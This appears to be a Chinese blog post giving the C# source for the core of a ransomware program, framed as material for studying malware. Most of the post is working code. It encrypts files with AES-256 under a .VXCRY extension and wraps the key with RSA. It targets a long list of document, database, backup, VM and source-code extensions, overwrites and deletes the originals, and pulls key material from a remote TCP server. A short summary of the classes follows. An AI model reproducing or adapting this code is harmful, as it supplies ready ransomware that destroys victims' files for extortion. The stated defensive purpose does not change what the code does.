在网络安全范畴，勒索软件严重威胁着组织和个人的数字资产安全。它凭借 AES、RSA 等加密算法，对关键数据进行高强度加密，将数据锁入 “数字堡垒”，逼迫受害者支付赎金换取解密密钥。​从技术视角看，勒索软件依托精心构建的复杂代码架构。下面探讨的代码是典型勒索软件的核心部分，其围绕 AES 和 RSA 算法，构建了密钥生成、管理、分发及文件加密解密的完整体系。代码间紧密协作，为勒索软件达成恶意目的提供技术支持。​深入研究这类代码，有助于剖析恶意软件运作机制，是网络安全防御获取关键信息的重要手段。

```csharp
using System;
using System.Diagnostics.Eventing.Reader;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace VortexSecOps
{
    namespace AesRsaCipherMix
    {
        public class AesRandomKeyPack
        {
            private string _aesKey;
            private string _key;
            /// <summary>
            /// 随机密钥
            /// </summary>
            public string Key
            {
                get { return _key.Clone().ToString(); }
                private set { _key = value; }
            }
            /// <summary>
            /// AES密钥
            /// </summary>
            public string AesKey
            {
                get { return _aesKey.Clone().ToString(); }
                private set { _aesKey = value; }
            }
            public AesRandomKeyPack(string aesKey, string Key)
            {
                this.AesKey = aesKey;
                this.Key = Key;
            }
            public string CombineKeys()
            {
                string[] Combine = { this.Key, this.AesKey };
                string strs = "----###5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq32861760876409234953718261392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e2861392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq328617608764092349537182###----";
                return Combine[0] + strs + Combine[1];
            }
        }
        public interface IAesRsaCryptographyService:IDisposable
        {
            /// <summary>
            /// 获取或设置 AES 密钥
            /// </summary>
            byte[] AesKey { get; set; }
            /// <summary>
            /// 是否开启加密白名单，默认值为false
            /// </summary>
            bool UseEncryptionWhitelist { get; set; }
            /// <summary>
            /// 文件加密白名单，指定不需要加密的文件类型，扩展名用通配符(例：*.txt)表示
            /// </summary>
            string[] NotEncryptedFileExtension { get; set; }
            /// <summary>
            /// 用AES加密文件
            /// </summary>
            /// <param name="filepath">文件路径</param>
            /// <param name="Key">AES密钥</param>
            /// <returns>返回false则表示已排除白名单</returns>
            bool EncryptFileWithAesKey(string filepath, bool debug = false);
            /// <summary>
            /// 用AES解密文件
            /// </summary>
            /// <param name="filepath">文件路径</param>
            /// 
            void DecryptFileWithAesKey(string filepath);
            /// <summary>
            /// 用RSA加密AES密钥
            /// </summary>
            /// <param name="PublicKey">RSA公钥的XML字符串</param>
            void EncryptAesKeyWithRsa(string PublicKey);
            /// <summary>
            /// 用RSA解密AES密钥
            /// </summary>
            void DecryptAesKeyWithRsa(string PrivateKey);
        }
        /// <summary>
        ///  该类用于封装 AES 加密所需的密钥（Key）和初始化向量（IV）。
        /// 它提供了对密钥和初始化向量的安全管理，确保密钥长度符合 AES 规范。
        /// </summary>
        public class AesKeyAndIv: IDisposable
        {
            private bool _ReadIV;
            public bool ReadIV
            {
                get
                {
                    return _ReadIV;
                }
                private set
                {
                    _ReadIV = value;
                }
            }
            private byte[] _key;
            private byte[] _iv;
            public byte[] Key
            {
                get { return _key; }
                private set
                {
                    if (value == null || (value.Length != 32 && value.Length != 24 && value.Length != 16))
                    {
                        throw new ArgumentException("AES 密钥长度必须为 16、24 或 32 字节。");
                    }
                    _key = value;
                }
            }
            public byte[] Iv
            {
                get { return _iv; }
                set
                {
                    if (value == null || value.Length != 16)
                    {
                        throw new ArgumentException("初始化向量必须为16字节");
                    }
                    ReadIV = false;
                    _iv = value;
                }
            }
            ~AesKeyAndIv()
            {
                /*if(_key !=null)
                {
                    Array.Clear(_key, 0, _key.Length);
                }*/
                if (_iv != null)
                {
                    Array.Clear(_iv, 0, _iv.Length); 
                }
            }
            void IDisposable.Dispose()
            {
                /*if (_key != null)
                {
                    Array.Clear(_key, 0, _key.Length);
                }*/
                if (_iv != null)
                {
                    Array.Clear(_iv, 0, _iv.Length);
                }
            }
            private AesKeyAndIv(byte[] Key, byte[] Iv, bool readIV=false)
            {
                this.Key = Key;
                this.Iv = Iv;
                if(readIV is true)
                {
                    ReadIV = true;
                }
            }
            /// <summary>
            /// 用于创建 AesKeyAndIv 类的新实例。
            /// </summary>
            /// <param name="Key">AES 加密使用的密钥，长度必须为 16、24 或 32 字节。</param>
            /// <param name="Iv">AES 加密使用的初始化向量，长度必须为 16 字节。</param>
            /// <returns></returns>
            public static AesKeyAndIv CreateNewAes(byte[] Key, byte[] Iv)
            {
                return new AesKeyAndIv(Key, Iv);
            }
            public static AesKeyAndIv CreateNewAes(byte[] Key)
            {
                byte[] buffer = null;
                using(Aes aes = Aes.Create())
                {
                    aes.BlockSize = 128;
                    aes.GenerateIV();
                    buffer = aes.IV;
                }
                return new AesKeyAndIv(Key, buffer,true);
            }
            public void RandomIV()
            {
                byte[] buffer = null;
                using (Aes aes = Aes.Create())
                {
                    aes.BlockSize = 128;
                    aes.GenerateIV();
                    buffer = aes.IV;
                }
                _iv = buffer;
            }
        }
        public class AesRsaEncryptionManager : IAesRsaCryptographyService
        {
            private byte[] _aesKey;
            byte[] IAesRsaCryptographyService.AesKey
            {
                get
                {
                    return _aesKey;
                }
                set
                {
                    if (value == null || value.Length != 32)
                    {
                        throw new ArgumentException("AesKey 长度必须为 32 字节。");
                    }
                    _aesKey = value;
                }
            }
            private bool _UseEncryptionWhitelist = false;
            public bool UseEncryptionWhitelist
            {
                get { return _UseEncryptionWhitelist; }
                set { _UseEncryptionWhitelist = value; }
            }
            private const string AES_KEY_FILE_PATH = @"C:\bin\AES_Key.bin";
            public const string AES_KEY_ENCRYPTED_FILE_PATH = @"C:\bin\AES_Key.bin.Encrypt";
            private string[] _notencryptedFileExtension;

            public string[] NotEncryptedFileExtension
            {
                get { return _notencryptedFileExtension; }
                set { _notencryptedFileExtension = value; }
            }
            public static string[] encryptedFileExtensions = {
                 // 办公文档
                 "*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.odt", "*.ods", "*.odp", "*.pdf", "*.rtf", "*.txt", "*.csv", "*.log",
                 // 数据库文件
                 "*.sql", "*.mdb", "*.db", "*.sqlite", "*.dbf", "*.accdb", "*.bak",
                 // 图片文件
                 "*.jpg", "*.jpeg", "*.png", "*.tif", "*.tiff", "*.ico", "*.bmp", "*.gif", "*.svg", "*.psd", "*.ai", "*.eps", "*.raw", "*.cr2", "*.nef",
                 // 视频文件
                 "*.mp4", "*.avi", "*.mov", "*.mkv", "*.flv", "*.wmv", "*.mpeg", "*.mpg", "*.3gp", "*.webm", "*.vob",
                 // 音频文件
                 "*.mp3", "*.wav", "*.flac", "*.ogg", "*.aac", "*.m4a", "*.wma", "*.mid", "*.amr",
                 // 压缩文件
                 "*.zip", "*.rar", "*.7z", "*.tar", "*.gz", "*.bz2", "*.xz",
                 // 可执行文件
                 "*.exe", "*.msi", "*.com", "*.bat", "*.sh", "*.ps1",
                 // 配置文件
                 "*.ini", "*.json", "*.xml", "*.cfg", "*.conf", "*.reg",
                 // 脚本文件
                 "*.py", "*.js", "*.php", "*.rb", "*.lua", "*.pl", "*.vb",
                 // 设计文件
                 "*.indd", "*.cdr", "*.xd", "*.sketch",
                 // 邮件文件
                 "*.eml", "*.msg", "*.pst", "*.ost",
                 // 工程文件
                  "*.vcxproj", "*.sln", "*.csproj", "*.fsproj", "*.java", "*.class", "*.cs", "*.cpp", "*.h", "*.hpp",
                 // 虚拟机文件
                 "*.vmdk", "*.vdi", "*.ova", "*.ovf",
                 // 网页文件
                 "*.html", "*.htm", "*.css", "*.jsx",
                 // 电子书文件
                 "*.epub", "*.mobi", "*.azw3",
                 // 其他杂项
                 "*.iso", "*.bin", "*.dat", "*.swf", "*.xps"
             };
            /// <summary>
            /// 不允许外部直接实例化
            /// </summary>
            private AesRsaEncryptionManager()
            {
                _aesKey = LoadAesKey();
            }
            /// <summary>
            /// 清除AES密钥防止内存取证
            /// </summary>
            ~AesRsaEncryptionManager()
            {
                if (!(_aesKey is null))
                {
                    Array.Clear(_aesKey, 0, _aesKey.Length);
                    _aesKey = null; 
                }
            }
            /// <summary>
            /// 创建AesRsaEncryptionManager对象的特定方法，实例化此类必须使用IAesRsaCryptographyService接口
            /// </summary>
            /// <returns>新的AesRsaEncryptionManager实例</returns>
            public static IAesRsaCryptographyService Create()
            {
                if (!Directory.Exists(@"C:\bin"))
                {
                    Directory.CreateDirectory(@"C:\bin");
                }
                return new AesRsaEncryptionManager();
            }
            void IDisposable.Dispose()
            {
                if (!(_aesKey is null))
                {
                    Array.Clear(_aesKey, 0, _aesKey.Length);
                    _aesKey = null; 
                }
            }
            private static byte[] RandomByte(int bufferSize)
            {
                byte[] randomBytes = new byte[bufferSize];
                using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
                {
                    rng.GetBytes(randomBytes);
                }
                return randomBytes;
            }
            /// <summary>
            /// 执行文件擦除
            /// </summary>
            /// <param name="filepath">目标文件路径</param>
            /// <param name="bufferSize">缓冲区大小，默认为4096</param>
            /// <exception cref="Exception"></exception>
            public static void fileWiper(string filepath, int bufferSize=4096)
            {
                try
                {
                    FileInfo fileinfo = new FileInfo(filepath);
                    if (!fileinfo.Exists)
                    {
                        return;
                    }
                    long fileLength = fileinfo.Length;
                    for (int i = 0; i < 7; i++)
                    {
                        byte[] randomBytes = null;
                        if(i < 2)
                        {
                            randomBytes = new byte[bufferSize];
                            if (i is 0)
                            {
                                for (int j = 0; j < randomBytes.Length; j++)
                                {
                                    randomBytes[j] = 0x00;
                                } 
                            }
                            else if (i is 1)
                            {
                                for (int j = 0; j < randomBytes.Length; j++)
                                {
                                    randomBytes[j] = 0xFF;
                                }
                            }
                        }
                        else
                        {
                            randomBytes=RandomByte(bufferSize);
                        }
                        using (FileStream fs = new FileStream(filepath, FileMode.Open, FileAccess.Write, FileShare.ReadWrite))
                        {
                            fs.Seek(0, SeekOrigin.Begin);
                            long bytesWritten = 0;
                            long remainingBytes = fileLength - bytesWritten;
                            while (remainingBytes > 0)
                            {
                                remainingBytes = fileLength - bytesWritten;
                                if (remainingBytes >= bufferSize)
                                {
                                    fs.Write(randomBytes, 0, bufferSize);
                                    bytesWritten += bufferSize;
                                }
                                else if (remainingBytes < bufferSize)
                                {
                                    fs.Write(randomBytes, 0, (int)remainingBytes);
                                    bytesWritten += remainingBytes;
                                    break;
                                }
                            }
                        }
                    }
                    File.Delete(filepath);
                }
                catch (IOException ex)
                {
                    //Console.WriteLine($"擦除 {filepath} 时出错：{ex.Message}");
                    throw new Exception($"擦除 {filepath} 时出错：{ex.Message}");
                }
                catch (Exception ex)
                {
                    //Console.WriteLine($"擦除 {filepath} 时出错：{ex.Message}");
                    throw new Exception($"擦除 {filepath} 时出错：{ex.Message}");
                }
            }
            /// <summary>
            /// 获取指定字节数组的SHA256哈希值
            /// </summary>
            /// <param name="bytes">指定字节数组</param>
            /// <returns>指定数组的SHA256哈希值</returns>
            public static string GetSHA256(byte[] bytes)
            {
                string strHash256 = null;
                using (SHA256 sha256 = SHA256Cng.Create())
                {
                    try
                    {
                        byte[] hash = sha256.ComputeHash(bytes);
                        StringBuilder stringBuilder = new StringBuilder();
                        foreach (byte b in hash)
                        {
                            stringBuilder.Append(b.ToString("x2"));
                        }
                        strHash256 = stringBuilder.ToString();
                    }
                    catch (Exception)
                    {

                    }
                }
                if (strHash256 is null)
                {
                    return string.Empty;
                }
                else
                {
                    return strHash256;
                }
            }
            /// <summary>
            /// 通过TCP协议从指定服务器获取RsaRandomKeyPack实例
            /// </summary>
            /// <param name="ipAddress">目标服务器的IP地址（IPv4格式）</param>
            /// <param name="aesKeyAndIv">用于解密从服务器接收数据的AES密钥和初始化向量</param>
            /// <param name="serverPort">目标服务器端口，默认值为8888</param>
            /// <returns>RsaRandomKeyPack实例</returns>
            /// <exception cref="TimeoutException">当连接服务器超时，抛出此异常。</exception>
            /// <exception cref="GetAesKeyException">当接收到的密钥格式无效或验证失败时触发此异常</exception>
            public static async Task<AesRandomKeyPack> GetRemoteAesKey(string ipAddress, AesKeyAndIv aesKeyAndIv, int serverPort = 8888)
            {
                string key;
                using (TcpClient tcpClient = new TcpClient())
                {
                    string localip = "127.0.0.1";
                    IPAddress[] ips = Dns.GetHostAddresses(Dns.GetHostName());
                    foreach (IPAddress ip in ips)
                    {
                        if (!ip.IsIPv6SiteLocal)
                        {
                            localip = ip.ToString();
                        }
                    }
                    using (CancellationTokenSource cancellationTokenSource = new CancellationTokenSource(20000))
                    {
                        Task connectTask = tcpClient.ConnectAsync(ipAddress, serverPort);
                        Task timeTask = Task.Delay(-1, cancellationTokenSource.Token);
                        if (await Task.WhenAny(connectTask, timeTask) == timeTask)
                        {
                            throw new TimeoutException("连接超时，请检查服务器状态。");
                        }
                        using (NetworkStream networkStream = tcpClient.GetStream())
                        {
                            using (BinaryReader binaryReader = new BinaryReader(networkStream))
                            {
                                string strRead = binaryReader.ReadString();
                                if (strRead.Length > 1024 * 1024)
                                {
                                    strRead = null;
                                    throw new GetAesKeyException("无法验证获取的密钥，因为发生缓冲区溢出");
                                }
                                key = AesDecrypt(Convert.FromBase64String(strRead), aesKeyAndIv);
                            }
                        }
                        string[] strs = { "----###5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq32861760876409234953718261392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e2861392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq328617608764092349537182###----" };
                        string[] tcpMessage = key.Split(strs, StringSplitOptions.RemoveEmptyEntries);
                        if (key.Length == 0 || tcpMessage.Length < 2 || tcpMessage[0] == key)
                        {
                            throw new GetAesKeyException("无法验证获取的密钥");
                        }
                        return new AesRandomKeyPack(tcpMessage[1], tcpMessage[0]);
                    }
                }
            }
            /// <summary>
            /// 通过TCP协议从指定服务器获取RsaRandomKeyPack实例
            /// </summary>
            /// <param name="ipAddress">目标服务器的IP地址（IPv4格式）</param>
            /// <param name="serverPort">目标服务器端口，默认值为8888</param>
            /// <returns>RsaRandomKeyPack实例</returns>
            /// <exception cref="TimeoutException">当连接服务器超时，抛出此异常。</exception>
            /// <exception cref="GetAesKeyException">当接收到的密钥格式无效或验证失败时触发此异常</exception>
            public static async Task<AesRandomKeyPack> GetRemoteAesKey(string ipAddress, int serverPort = 8888)
            {
                string key;
                using (TcpClient tcpClient = new TcpClient())
                {
                    string localip = "127.0.0.1";
                    IPAddress[] ips = Dns.GetHostAddresses(Dns.GetHostName());
                    foreach (IPAddress ip in ips)
                    {
                        if (!ip.IsIPv6SiteLocal)
                        {
                            localip = ip.ToString();
                        }
                    }
                    using (CancellationTokenSource cancellationTokenSource = new CancellationTokenSource(20000))
                    {
                        Task connectTask = tcpClient.ConnectAsync(ipAddress, serverPort);
                        Task timeTask = Task.Delay(-1, cancellationTokenSource.Token);
                        if (await Task.WhenAny(connectTask, timeTask) == timeTask)
                        {
                            throw new TimeoutException("连接超时，请检查服务器状态。");
                        }
                        using (NetworkStream networkStream = tcpClient.GetStream())
                        {
                            using (BinaryReader binaryReader = new BinaryReader(networkStream))
                            {
                                key = binaryReader.ReadString();
                                if (key.Length > 1024 * 1024)
                                {
                                    key = null;
                                    throw new GetAesKeyException("无法验证获取的密钥，因为发生缓冲区溢出");
                                }
                            }
                        }
                        string[] strs = { "----###5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq32861760876409234953718261392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e2861392654750861M9hQaSjWkXyLbNvOriUFtPxrEJgCnqD2e5Y7rG3k9P1x2q8F4w6J0m7E5a3S2t1Z9v4U6n8L0b6C3g7D1i5O2h4K8M9y3R6f0V7e2N1s9W4Q5X0T6u7j8pe2D165f76308764028795349173286139265475086M1hQ9aSjWkXyLbNvOriUFtPxrEJgCnq328617608764092349537182###----" };
                        string[] tcpMessage = key.Split(strs, StringSplitOptions.RemoveEmptyEntries);
                        if (key.Length == 0 || tcpMessage.Length < 2 || tcpMessage[0] == key)
                        {
                            throw new GetAesKeyException("无法验证获取的密钥");
                        }
                        return new AesRandomKeyPack(tcpMessage[1], tcpMessage[0]);
                    }
                }
            }
            /// <summary>用 AES 加密字符串</summary>
            /// <param name="plainText">明文字符串</param>
            /// <param name="aesKeyAndIv">AES 密钥和初始化向量</param>
            /// <returns>加密后的字节数组</returns>
            public static byte[] AesEncrypt(string plainText, AesKeyAndIv aesKeyAndIv)
            {
                byte[] encryped;
                using (var aes = Aes.Create())
                {
                    aes.Key = aesKeyAndIv.Key;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    ICryptoTransform cryptoTransform=null;
                    using (MemoryStream memory = new MemoryStream())
                    {
                        if(aesKeyAndIv.ReadIV is true)
                        {
                            aesKeyAndIv.RandomIV();
                            aes.IV=aesKeyAndIv.Iv;
                            aes.Mode = CipherMode.CBC;
                            aes.Padding = PaddingMode.PKCS7;
                            memory.Write(aes.IV, 0, aes.IV.Length);
                            memory.Seek(aes.IV.Length, SeekOrigin.Begin);
                        }
                        else
                        {
                            aes.IV = aesKeyAndIv.Iv;
                        }
                        cryptoTransform = aes.CreateEncryptor();
                        using (CryptoStream crypto = new CryptoStream(memory, cryptoTransform, CryptoStreamMode.Write))
                        {
                            using (StreamWriter streamWriter = new StreamWriter(crypto))
                            {
                                streamWriter.Write(plainText);
                            }
                        }
                        encryped = memory.ToArray();
                    }
                }
                return encryped;
            }
            /// <summary>用 AES 解密字符串</summary>
            /// <param name="encryped">加密后的字节数组</param>
            /// <param name="aesKeyAndIv">AES 密钥和初始化向量</param>
            /// <returns>解密后的明文字符串</returns>
            public static string AesDecrypt(byte[] encryped, AesKeyAndIv aesKeyAndIv)
            {
                string plaintext = null;
                using (var aes = Aes.Create())
                {
                    aes.Key = aesKeyAndIv.Key;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    using (MemoryStream memory = new MemoryStream(encryped))
                    {
                        if(aesKeyAndIv.ReadIV is true)
                        {
                            byte[] buffer1 = new byte[16];
                            memory.Read(buffer1, 0, buffer1.Length);
                            memory.Seek(buffer1.Length, SeekOrigin.Begin);
                            if(buffer1 is null || buffer1.Length != 16)
                            {
                                throw new CryptographicException("IV长度出错");
                            }
                            aes.IV = buffer1;
                        }
                        else
                        {
                            aes.IV=aesKeyAndIv.Iv;
                        }
                        ICryptoTransform cryptoTransform = aes.CreateDecryptor(aes.Key,aes.IV);
                        using (CryptoStream crypto = new CryptoStream(memory, cryptoTransform, CryptoStreamMode.Read))
                        {
                            using (StreamReader streamReader = new StreamReader(crypto))
                            {
                                plaintext = streamReader.ReadToEnd();
                            }
                        }
                    }
                }
                return plaintext;
            }
            /// <summary>用 RSA 加密字节数组</summary>
            /// <param name="plainTextBytes">待加密的字节数组</param>
            /// <param name="PublicKey">RSA 公钥的 XML 字符串</param>
            /// <returns>加密后的字节数组</returns>
            public static byte[] RsaEncrypt(byte[] plainTextBytes, string PublicKey)
            {
                byte[] cipherText;
                using (var rSA = new RSACng(4096))
                {
                    rSA.FromXmlString(PublicKey);
                    cipherText = rSA.Encrypt(plainTextBytes, RSAEncryptionPadding.OaepSHA512);
                }
                return cipherText;
            }
            /// <summary>用 RSA 解密字节数组</summary>
            /// <param name="cipherText">待解密的字节数组</param>
            /// <param name="PrivateKey">RSA 私钥</param>
            /// <returns>解密后的字节数组</returns>
            public static byte[] RsaDecrypt(byte[] cipherText, string PrivateKey)
            {
                byte[] plainTextBytes;
                using (var rSA = new RSACng(4096))
                {
                    rSA.FromXmlString(PrivateKey);
                    plainTextBytes = rSA.Decrypt(cipherText, RSAEncryptionPadding.OaepSHA512);
                }
                return plainTextBytes;
            }
            void IAesRsaCryptographyService.EncryptAesKeyWithRsa(string PublicKey)
            {
                using (var rSA = new RSACng(4096))
                {
                    rSA.FromXmlString(PublicKey);
                    try
                    {
                        byte[] AES_Key = _aesKey;
                        byte[] AES_Key_Encrypt = rSA.Encrypt(AES_Key, RSAEncryptionPadding.OaepSHA512);
                        File.WriteAllBytes(AES_KEY_ENCRYPTED_FILE_PATH, AES_Key_Encrypt);
                    }
                    catch (Exception)
                    {
                        return;
                    }
                }
            }
            void IAesRsaCryptographyService.DecryptAesKeyWithRsa(string PrivateKey)
            {
                using (RSA rSA = new RSACng(4096))
                {
                    rSA.FromXmlString(PrivateKey);
                    if (File.Exists(AES_KEY_ENCRYPTED_FILE_PATH))
                    {
                        try
                        {
                            byte[] AES_Key = File.ReadAllBytes(AES_KEY_ENCRYPTED_FILE_PATH);
                            byte[] AES_Key_Decrypt = rSA.Decrypt(AES_Key, RSAEncryptionPadding.OaepSHA512);
                            File.WriteAllBytes(AES_KEY_FILE_PATH, AES_Key_Decrypt);
                            File.Delete(AES_KEY_ENCRYPTED_FILE_PATH);
                        }
                        catch (Exception)
                        {
                            return;
                        }
                    }
                }
            }
            bool IAesRsaCryptographyService.EncryptFileWithAesKey(string filepath, bool debug)
            {
                if (_UseEncryptionWhitelist is true)
                {
                    foreach (string fileExtension in NotEncryptedFileExtension)
                    {
                        if (fileExtension == $"*{Path.GetExtension(filepath)}")
                        {
                            return false;
                        }
                    }
                }
                int buffersize;
                FileInfo fileInfo = new FileInfo(filepath);
                if (fileInfo.Length > 1024 * 1024 && fileInfo.Length <= 1024 * 1024 * 100)
                {
                    buffersize = 1024 * 20;
                }
                else if (fileInfo.Length > 1024 * 1024 * 100 && fileInfo.Length <= 1024 * 1024 * 1024)
                {
                    buffersize = 1024 * 64;
                }
                else if (fileInfo.Length > 1024 * 1024 * 1024)
                {
                    buffersize = 1024 * 256;
                }
                else
                {
                    buffersize = 1024 * 3;
                }
                byte[] buffer = new byte[buffersize];
                int readfile = 0;
                try
                {
                    if (filepath != AES_KEY_FILE_PATH && filepath != AES_KEY_ENCRYPTED_FILE_PATH)
                    {
                        if (File.Exists(filepath))
                        {
                            using (Aes aes = Aes.Create())
                            {
                                aes.BlockSize = 128;
                                aes.Key = _aesKey;
                                aes.GenerateIV();
                                aes.Mode = CipherMode.CBC;
                                aes.Padding = PaddingMode.PKCS7;
                                string filepathencrypt = Path.ChangeExtension(filepath, $"{Path.GetExtension(filepath)}.VXCRY");
                                var cryptoTransform = aes.CreateEncryptor(aes.Key, aes.IV);
                                using (var fileStream = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.Read))
                                using (var fileStream1 = new FileStream(filepathencrypt, FileMode.Create, FileAccess.Write, FileShare.Write))
                                {
                                    fileStream1.Write(aes.IV, 0, 16);
                                    using (var crypto = new CryptoStream(fileStream1, cryptoTransform, CryptoStreamMode.Write))
                                    {
                                        while ((readfile = fileStream.Read(buffer, 0, buffersize)) > 0)
                                        {
                                            crypto.Write(buffer, 0, readfile);
                                        }
                                    }
                                }
                            }
                            AesRsaEncryptionManager.fileWiper(filepath, buffersize);
                        }
                    }
                }
                catch (IOException ex)
                {
                    if (debug)
                    {
                        try
                        {
                            using (StreamWriter sw = new StreamWriter(@"C:\encryptDebug.txt", true, Encoding.UTF8))
                            {
                                sw.WriteLine(ex.Message);
                                sw.WriteLine(ex.GetType().ToString());
                            }
                        }
                        catch (Exception)
                        {
                        }
                    }
                    return false;
                }
                catch (UnauthorizedAccessException ex)
                {
                    if (debug)
                    {
                        try
                        {
                            using (StreamWriter sw = new StreamWriter(@"C:\encryptDebug.txt", true, Encoding.UTF8))
                            {
                                sw.WriteLine(ex.Message);
                                sw.WriteLine(ex.GetType().ToString());
                            }
                        }
                        catch (Exception)
                        {
                        }
                    }
                    return false;
                }
                catch (Exception ex)
                {
                    if (debug)
                    {
                        try
                        {
                            using (StreamWriter sw = new StreamWriter(@"C:\encryptDebug.txt", true, Encoding.UTF8))
                            {
                                sw.WriteLine(ex.Message);
                                sw.WriteLine(ex.GetType().ToString());
                            }
                        }
                        catch (Exception)
                        {

                        }
                    }
                }
                return true;
            }
            void IAesRsaCryptographyService.DecryptFileWithAesKey(string filepath)
            {
                if (filepath != AES_KEY_FILE_PATH && filepath != AES_KEY_ENCRYPTED_FILE_PATH)
                {
                    int buffersize;
                    FileInfo fileInfo = new FileInfo(filepath);
                    if (fileInfo.Length > 1024 * 1024 && fileInfo.Length <= 1024 * 1024 * 100)
                    {
                        buffersize = 1024 * 20;
                    }
                    else if (fileInfo.Length > 1024 * 1024 * 100 && fileInfo.Length <= 1024 * 1024 * 1024)
                    {
                        buffersize = 1024 * 64;
                    }
                    else if (fileInfo.Length > 1024 * 1024 * 1024)
                    {
                        buffersize = 1024 * 256;
                    }
                    else
                    {
                        buffersize = 1024 * 3;
                    }
                    byte[] buffer = new byte[buffersize];
                    if (_aesKey.Length != 32)
                    {
                        MessageBox.Show("导入的密钥不符合要求", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }
                    using (Aes aes = Aes.Create())
                    {
                        byte[] iv = new byte[16];
                        aes.Key = _aesKey;
                        aes.Mode = CipherMode.CBC;
                        aes.Padding = PaddingMode.PKCS7;
                        try
                        {
                            if (File.Exists(filepath))
                            {
                                int readfile = 0;
                                string filename = Path.GetFileNameWithoutExtension(filepath);
                                string directory = Path.GetDirectoryName(filepath);
                                string newfilepath = Path.Combine(directory, filename);
                                using (FileStream fileStream = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.None))
                                using (FileStream fileStream1 = new FileStream(newfilepath, FileMode.Create, FileAccess.Write, FileShare.None))
                                {
                                    int readIV = fileStream.Read(iv, 0, 16);
                                    if (readIV < 16)
                                    {
                                        MessageBox.Show("文件损坏或未加密", "错误", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                        return;
                                    }
                                    aes.IV = iv;
                                    var crypt = aes.CreateDecryptor();
                                    using (CryptoStream crypto = new CryptoStream(fileStream, crypt, CryptoStreamMode.Read))
                                    {
                                        while ((readfile = crypto.Read(buffer, 0, buffersize)) > 0)
                                        {
                                            fileStream1.Write(buffer, 0, readfile);
                                        }
                                    }
                                }
                                Task.Run(async () =>
                                {
                                    await Task.Delay(200);
                                    File.Delete(filepath);
                                });
                            }
                        }
                        catch (Exception)
                        {

                        }
                    }
                }
            }
            /// <summary>
            /// 生成 AES-256 密钥
            /// </summary>
            /// <returns></returns>
            public static byte[] LoadAesKey()
            {
                try
                {
                    using (Aes aes = Aes.Create())
                    {
                        aes.KeySize = 256;
                        aes.GenerateKey();
                        return aes.Key;
                    }
                }
                catch (Exception)
                {
                    return new byte[0];
                }
            }
            public static string Random_Key()
            {
                // 创建一个Random对象，用于生成随机数
                Random random = new Random();
                // 将包含大小写字母和数字的字符串转换为字符数组，作为生成密钥的字符来源
                char[] KEYChar = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789".ToCharArray();
                // 创建一个长度为27的字符数组，用于存储生成的密钥字符
                char[] Key = new char[27];
                // 循环27次，每次生成一个随机索引，从KEYChar字符数组中选取对应字符放入Key数组中，以此构建密钥字符串
                for (int i = 0; i < 27; i++)
                {
                    int index = random.Next(0, KEYChar.Length);
                    Key[i] = KEYChar[index];
                }
                // 将生成的字符数组转换为字符串并返回，作为随机生成的密钥
                return new string(Key);
            }
        }
        /// <summary>
        /// 密钥格式无效或验证失败时触发此异常
        /// </summary>
        class GetAesKeyException : Exception
        {
            public GetAesKeyException() : base() { }
            public GetAesKeyException(string message) : base(message) { }
        }
    }
}
```

> - **关键类和接口**
>   - **`AesRandomKeyPack`类**：用于封装 AES 密钥和对应的随机验证码。通过构造函数传入验证码和密钥，`CombineRsaAndRandomKeys`方法将两者组合成特定格式的字符串，用于在网络传输中标识和关联这两个密钥。
>   - **`IAesRsaCryptographyService`接口**：定义了文件加密、解密以及 AES 密钥加密、解密的抽象方法。这使得不同的加密实现类可以通过实现该接口，提供统一的对外接口，方便在不同场景下进行替换和扩展。
>   - **`AesKeyAndIv`类**：负责管理 AES 加密所需的密钥和初始化向量（IV）。通过构造函数传入密钥和 IV，并在属性中进行安全检查，确保密钥长度符合 AES 规范（16、24 或 32 字节），IV 长度为 16
> 字节。CreateNewAes方法用于创建该类的实例，保证创建过程的一致性和规范性。
>   - **`AesRsaEncryptionManager`类**：实现了`IAesRsaCryptographyService`接口，提供了具体的加密和解密功能。该类是整个加密系统的核心，包含了文件加密、解密，AES
> 密钥加密、解密以及从服务器获取 RSA 私钥等方法。同时，它还定义了一些常量，如 AES 密钥文件路径和加密后 AES
> 密钥文件路径，以及支持加密的文件扩展名列表。 从服务器获取 RSA 私钥
 
